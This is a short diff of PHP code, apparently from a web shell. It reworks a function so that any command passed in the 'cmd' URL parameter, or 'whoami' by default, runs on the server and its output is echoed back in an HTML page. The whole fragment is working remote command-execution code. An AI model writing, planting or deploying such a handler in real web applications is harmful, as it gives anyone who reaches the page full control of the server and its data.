@@ -28,12 +28,10 @@ function Exec_Run($cmd) {
 function Exec_g() {
 	$res = '回显';
 	$cmd = 'whoami';
-	if (empty($_GET['cmd'])) {
-		$res = Exec_Run($cmd);
-	} else {
+	if (!empty($_GET['cmd'])) {
 		$cmd = $_GET['cmd'];
-		$res = Exec_Run($_GET['cmd']);
 	}
+	$res = Exec_Run($cmd);
 	print <<<END
 	<pre>
 	command >> <span style="color:red">{$cmd}</span>
